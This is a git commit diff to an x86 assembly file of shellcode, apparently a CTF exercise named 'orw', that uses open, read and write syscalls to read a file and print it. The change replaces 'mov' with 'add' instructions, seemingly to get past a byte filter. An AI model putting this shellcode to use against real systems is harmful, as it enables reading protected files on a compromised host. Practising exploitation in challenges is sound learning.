3e974931f4e81deb2bdf1cf6fc71128bb1e0370f
wxr031 <wxr031@protonmail.com>
2019-01-31 04:46:51 +0000

    change shellcode and remove gdb_history

--- orw/shellcode.s
+++ orw/shellcode.s
@@ -3,27 +3,27 @@ jmp short bottom
 back:
 	pop ebx
 	xor eax, eax
-	mov al, 5
+	add al, 5
 	xor ecx, ecx
 	int 0x80
 
 	mov ecx, ebx
 	mov ebx, eax
 	xor eax, eax
-	mov al, 3
+	add al, 3
 	xor edx, edx
-	mov dh, 0x01
+	add dh, 0x01
 	int 0x80
 	
 	mov edx, eax
 	xor eax, eax
-	mov al, 4
+	add al, 4
 	xor ebx, ebx
-	mov bl, 1
+	add bl, 1
 	int 0x80
 
 	xor eax, eax
-	mov al, 1
+	add al, 1
 	xor ebx, ebx
 	int 0x80
 	
